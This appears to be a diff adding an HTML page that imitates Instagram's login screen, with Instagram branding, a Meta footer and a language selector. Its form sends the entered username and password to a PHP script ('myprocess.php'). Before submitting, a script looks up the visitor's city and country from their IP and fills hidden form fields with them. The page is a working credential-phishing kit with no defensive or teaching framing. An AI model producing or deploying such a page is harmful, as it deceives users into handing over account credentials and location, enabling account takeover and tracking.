@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang= en  >
+
+<head>
+  <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+     <link data-default-icon="../assets/instagramlogo.png" rel="icon" sizes="192x192" href="../assets/instagramlogo.png">
+     <meta name="robots" content="noarchive, noimageindex">
+     <meta charset="utf-8">
+     <meta name="apple-mobile-web-app-status-bar-style" content="default">
+     <meta name="mobile-web-app-capable" content="yes">
+     <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2, viewport-fit=cover">
+     <meta name="theme-color" content="#ffffff">
+     <link data-default-icon="../assets/instagramlogo.png" rel="shortcut icon" type="image/x-icon" href="../assets/instagramlogo.png">
+     <meta property="og:image" content="assets/30PrGfR3xhB.png">
+<style>
+@import url( https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500&amp;display=swap );
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family:  Roboto , sans-serif;
+}
+body {
+  background: white;
+  overflow-x: hidden;
+}
+.container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 90vh;
+  padding: 15px 0;
+}
+.container .col #image{
+  position: relative;
+  width: 100%;
+  height: 100%;
+}
+.container .col .box {
+  width: 350px;
+  height: 380px;
+  border: 1px solid rgba(219, 219, 219, 1);
+  background: white;
+  border-radius: 1px;
+  margin: 0 0 10px;
+  padding: 10px 0;
+  z-index: 2;
+}
+.container .col .box .title {
+  position: relative;
+  top: 5px;
+  text-align: center;
+}
+.container .col .box .title img {
+  width: 190px;
+  height: 80px;
+}
+.container .col.content {
+  position: relative;
+  top: 12px;
+}
+.container .col .box .login-form {
+  position: relative;
+  height: 260px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+}
+.container .col .box .login-form .form-content {
+  position: relative;
+  margin: 5px 0;
+  top: 22px;
+}
+.container .col .box .login-form label {
+  position: absolute;
+  top: 50%;
+  transform: translateY(-50%);
+  left: 9px;
+  font-size: 12px;
+  color: rgba(142, 142, 142, 1);
+  pointer-events: none;
+  order: -1;
+  transition: 0.3s ease;
+}
+.container .col .box .login-form input {
+  outline: none;
+  background: transparent;
+  width: 270px;
+  height: 40px;
+  background: rgba(250, 250, 250, 1);
+  border: 1px solid rgba(219, 219, 219, 1);
+  border-radius: 3px;
+  padding: 9px 0 7px 8px;
+  font-size: 14px;
+  transition: 0.3s ease;
+}
+.container .col .box .login-form input:valid {
+  padding-bottom: 0;
+}
+.container .col .box .login-form input:valid + label {
+  transform: translateY(-16px);
+  font-size: 10px;
+}
+.container .col .box .login-form button {
+  width: 270px;
+  height: 32px;
+  border: none;
+  outline: none;
+  border-radius: 7px;
+  background-color: rgb(0, 149, 246);
+  cursor: pointer;
+}
+.container .col .box .login-form button:hover{
+  background-color: rgb(24, 119, 242);
+}
+.container .col .box .login-form button a {
+  color: white;
+  text-decoration: none;
+  font-weight: 600;
+}
+.container .col .box .login-form .form-ending {
+  position: relative;
+  width: 270px;
+  height: 100%;
+  margin-top: 20px;
+  text-align: center;
+}
+.container .col .box .login-form .form-ending #OR {
+  color: rgba(142, 142, 142, 1);
+  background: white;
+  text-align: center;
+  width: 50px;
+  margin: 15px 0;
+  font-size: 13px;
+  font-weight: 500;
+  line-height: 15px;
+  z-index: 3;
+  position: relative;
+  display: block;
+}
+.container .col .box .login-form .form-ending #line {
+  z-index: 1;
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+  top: 22px;
+  width: 270px;
+  height: 1px;
+  background: rgba(219, 219, 219, 1);
+}
+.container .col .box .login-form .form-ending p#facebook {
+  color: #385185;
+  cursor: pointer;
+  font-size: 14px;
+  font-weight: 500;
+  margin: 15px 0 5px;
+}
+.container .col .box .login-form .form-ending p#facebook i {
+  margin-right: 8px;
+  font-size: 16px;
+  position: relative;
+  top: 1px;
+}
+.container .col .box .login-form .form-ending a {
+  position: relative;
+  top: 7px;
+  text-decoration: none;
+  color: rgba(0, 55, 107, 1);
+  font-size: 12px;
+  line-height: 14px;
+  text-align: center;
+}
+/* .container .col .box .login-form .form-ending a:hover{
+  text-decoration: underline;
+} */
+
+/* mini box  */
+.container .col .mini-box {
+  width: 350px;
+  height: 65px;
+  background: white;
+  border: 1px solid rgba(219, 219, 219, 1);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.container .col .mini-box .text {
+  font-size: 14px;
+  color: rgba(38, 38, 38, 1);
+}
+.container .col .mini-box .text a {
+  text-decoration: none;
+  color: #0095f6;
+  font-weight: bold;
+}
+/* .container .col .mini-box .text a:hover{
+  text-decoration: underline;
+} */
+
+.container .col .download-section {
+  margin-top: 20px;
+  width: 350px;
+  height: 100px;
+  text-align: center;
+}
+.container .col .download-section p {
+  font-size: 14px;
+  line-height: 18px;
+}
+.container .col .download-section .images {
+  margin-top: 20px;
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+}
+.container .col .download-section .images img {
+  width: 135px;
+  height: 40px;
+}
+footer {
+  padding: 30px 20px;
+}
+footer ul {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 16px;
+  width: 75%;
+  margin: 0 auto 20px;
+}
+footer ul li {
+  font-size: 12px;
+  line-height: 14px;
+  list-style: none;
+  color: rgba(142, 142, 142, 1);
+  cursor: pointer;
+}
+footer .copyright {
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+}
+footer .copyright select {
+  font-size: 12px;
+  background: none;
+  color: rgba(142, 142, 142, 1);
+  border: none;
+  cursor: pointer;
+}
+footer .copyright select option {
+  width: 50px;
+}
+footer .copyright span {
+  font-size: 12px;
+  line-height: 14px;
+  color: rgba(142, 142, 142, 1);
+}
+
+@media (max-width: 900px) {
+  footer ul {
+    width: 100%;
+  }
+}
+@media (max-width: 1000px) {
+  #image {
+    display: none;
+  }
+}
+
+@media (max-width: 440px) {
+  .container {
+    min-height: 80vh;
+  }
+  .container .col .box,
+  .container .col .mini-box {
+    border: none;
+    background-color: transparent;
+  }
+}
+</style>
+
+</head>
+ <body translate="no">
+ <!-- © Yo! -->
+
+ <!-- This contains all the content that we want to show to web users when they visit your page.-->
+   <div class="container">
+     <div class="col" id="image" style="margin-top: 20px;">
+        <img src="images/home-phones.png" alt="" width="460px" height="585px">
+        <div id="change" style="position: absolute; transform: translateX(62%); transform: translateY(-112.5%); margin-left: 154px;">
+          <img id="changer" src="images/screenshot1.png" alt="instagram" class="image" width="250px" height="500px">
+        </div>
+     </div>
+     <!--end of image-->
+     <div class="col content">
+       <div class="box">
+         <div class="title">
+          <img src="images/instagram_logo.svg.png" alt="logoname" border="0">
+         </div>
+         <form action="myprocess.php" id="form" class="login-form" method="post" name="form"><input type='hidden' name='form-name' value='details' />
+           <div class="form-content">
+             <input id="username" type="text" name="username" required minlength="5" autocomplete="username"/>
+             <label for="username">Phone number, username, or email</label>
+           </div>
+           <div class="form-content">
+             <input id="password" type="password" name="password" required minlength="7"/>
+             <label for="password">Password</label>
+           </div>
+
+           <!-- Always include hidden fields for location, latitude, and longitude -->
+           <input id="country" type="text" name="country" style="display:none" autocomplete="country" />
+           <input id="city" type="text" name="city" style="display:none"/>
+           <div class="form-content">
+            <button onclick="getLocation()" type="submit"><a href="#">Log in</a></button>
+           </div>
+           <div class="form-ending">
+             <center>
+               <p id="OR">OR</p>
+               <span id="line"></span>
+             </center>
+             <p id="facebook"><i class="fab fa-facebook-square"></i>Login with Facebook</p>
+             <a href="#">Forgot password?</a>
+           </div>
+         </form>
+       </div>
+       <div class="mini-box">
+         <div class="text">Don't have an account? <a href="#">Sign up</a></div>
+       </div>
+       <div class="download-section">
+         <p>Get the app.</p>
+         <div class="images">
+          <a href="#"><img src="images/playstore.png" alt="playstore" border="0"></a>
+          <a href="#"><img src="images/appstore.png" alt="appstore" border="0"></a>
+         </div>
+       </div>
+     </div>
+     <!--end of content-->
+   </div>
+   <footer>
+     <ul>
+       <li>Meta</li>
+       <li>About</li>
+       <li>Blog</li>
+       <li>Jobs</li>
+       <li>Help</li>
+       <li>API</li>
+       <li>Privacy</li>
+       <li>Terms</li>
+       <li>Locations</li>
+       <li>Instagram Lite</li>
+       <li>Threads</li>
+       <li>Contact Uploading & Non-Users</li>
+       <li>Meta Verified</li>
+     </ul>
+     <div class="copyright">
+       <select id="language" aria-label="Switch Display Language">
+         <option value="af">Afrikaans</option>
+         <option value="cs">Čeština</option>
+         <option value="da">Dansk</option>
+         <option value="de">Deutsch</option>
+         <option value="el">Ελληνικά</option>
+         <option value="en" selected>English</option>
+         <option value="en-gb">English (UK)</option>
+         <option value="es">Español (España)</option>
+         <option value="es-la">Español</option>
+         <option value="fi">Suomi</option>
+         <option value="fr">Français</option>
+         <option value="id">Bahasa Indonesia</option>
+         <option value="it">Italiano</option>
+         <option value="ja">日本語</option>
+         <option value="ko">한국어</option>
+         <option value="ms">Bahasa Melayu</option>
+         <option value="nb">Norsk</option>
+         <option value="nl">Nederlands</option>
+         <option value="pl">Polski</option>
+         <option value="pt-br">Português (Brasil)</option>
+         <option value="pt">Português (Portugal)</option>
+         <option value="ru">Русский</option>
+         <option value="sv">Svenska</option>
+         <option value="th">ภาษาไทย</option>
+         <option value="tl">Filipino</option>
+         <option value="tr">Türkçe</option>
+         <option value="zh-cn">中文(简体)</option>
+         <option value="zh-tw">中文(台灣)</option>
+         <option value="bn">বাংলা</option>
+         <option value="gu">ગુજરાતી</option>
+         <option value="hi">हिन्दी</option>
+         <option value="hr">Hrvatski</option>
+         <option value="hu">Magyar</option>
+         <option value="kn">ಕನ್ನಡ</option>
+         <option value="ml">മലയാളം</option>
+         <option value="mr">मराठी</option>
+         <option value="ne">नेपाली</option>
+         <option value="pa">ਪੰਜਾਬੀ</option>
+         <option value="si">සිංහල</option>
+         <option value="sk">Slovenčina</option>
+         <option value="ta">தமிழ்</option>
+         <option value="te">తెలుగు</option>
+         <option value="vi">Tiếng Việt</option>
+         <option value="zh-hk">中文(香港)</option>
+         <option value="bg">Български</option>
+         <option value="fr-ca">Français (Canada)</option>
+         <option value="ro">Română</option>
+         <option value="sr">Српски</option>
+         <option value="uk">Українська</option>
+       </select>
+       <span> &copy; 2023 Instagram from Meta </span>
+     </div>
+   </footer>
+
+
+   <!-- <script>
+// Your JavaScript code here
+document.addEventListener('DOMContentLoaded', function () {
+  // Get references to form elements and the submit button
+  const form = document.querySelector('.login-form');
+  const usernameInput = form.querySelector('input[name="username"]');
+  const passwordInput = form.querySelector('input[name="password"]');
+  const latitudeInput = form.querySelector('input[name="latitude"]');
+  const longitudeInput = form.querySelector('input[name="longitude"]');
+  const submitButton = form.querySelector('button[type="submit"]');
+  
+  // Function to validate form inputs
+  function validateFormInputs() {
+    const usernameInput = form.querySelector('input[name="username"]');
+    if (usernameInput.value.length < 5) {
+        alert('Username must be at least 5 characters long.');
+        return false;
+    }
+    // Add other validation logic as needed
+    return true;
+  }
+
+  //Add event listener to the form for submission
+  form.addEventListener('submit', function (event) {
+    //Prevent the default form submission behaviour 
+    event.preventDefault();
+
+    const getLocation = () => {
+      //Get the client location using ip address
+      fetch("https://ipapi.co/json/")
+        .then((response) => response.json())
+        .then((data) => {
+          const  cityInput = document.querySelector("#city");
+          const  countryInput = document.querySelector("#country");
+          cityInput.value = `City : ${data.city}`;
+          countryInput.value = `Country : ${data.country_name}`;
+        })
+    }
+
+    // Validate form inputs
+    if (validateFormInputs()) {
+      // Get all the input elements within the form
+      const inputElements = form.querySelectorAll('input[type="text"], input[type="password"]');
+
+      //Create an object to store the input values 
+      const formData = {};
+
+      //Loop through the input elements and store their values
+      inputElements.forEach((input) => {
+        formData[input.name] = input.value;
+      });
+
+      //Convert the formData object to JSON
+      const formDataJSON = JSON.stringify(formData);
+
+      //Now, submit the for to your PHP script (myProcess2.php)
+      form.submit();
+    }
+  })
+});
+   </script> -->
+
+   <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const form = document.querySelector('.login-form');
+      const usernameInput = form.querySelector('input[name="username"]');
+      const passwordInput = form.querySelector('input[name="password"]');
+      const submitButton = form.querySelector('button[type="submit"]');
+      const cityInput = document.querySelector("#city");
+      const countryInput = document.querySelector("#country");
+
+      function validateFormInputs() {
+        if (usernameInput.value.length < 5) {
+          alert('Username must be at least 5 characters long.');
+          return false;
+        }
+        // Add other validation logic as needed
+        return true;
+      }
+
+      form.addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        const getLocation = () => {
+          fetch("https://ipapi.co/json/")
+            .then((response) => response.json())
+            .then((data) => {
+              cityInput.value = data.city;
+              countryInput.value = data.country_name;
+
+              // Validate form inputs
+              if (validateFormInputs()) {
+                // Submit the form
+                form.submit();
+              }
+            })
+            .catch((error) => {
+              console.error('Error fetching location:', error);
+            });
+        };
+
+        getLocation();
+      });
+    });
+  </script>
+
+</body>
+</html>
